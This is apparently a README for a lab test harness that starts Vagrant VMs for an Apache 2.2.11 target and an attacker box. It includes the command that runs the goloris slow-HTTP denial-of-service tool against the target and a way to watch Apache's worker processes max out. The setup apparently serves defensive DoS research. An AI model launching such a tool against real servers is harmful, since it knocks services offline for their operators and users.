MAGICWAND Test Harness
=======

## Start target and attacker VMs

```
# Start Apache 2.2.11 server to be attacked (192.168.33.10)
pushd test-harness/apache
vagrant up
popd

# Start the attacker box (192.168.33.11)
pushd test-harness/goloris
vagrant up
popd
```

If the `vagrant up` fails, you may need to download the base box. Run `vagrant box add ubuntu/trusty32`.

### Start Apache 2.2.11 (vagrant provisioning should do this already)

```
sudo /usr/local/apache2/bin/apachectl start
```

### Attack Apache with goloris

```
cd test-harness/goloris
vagrant ssh
cd gocode/bin
./goloris -victimUrl="http://192.168.33.10:80"
```

### See the impact

On the machine:

```
cd test-harness/apache
vagrant ssh

# Maxes out around 256 processes
ps aux | grep httpd | wc -l
```

Or by fetching the web page from your host machine

http://192.168.33.10

### Installing an old version of nginx (not currently used)

```
http://hg.nginx.org/nginx/archive/release-1.5.8.tar.gz
./auto/configure --without-http_rewrite_module --without-http_gzip_module
```
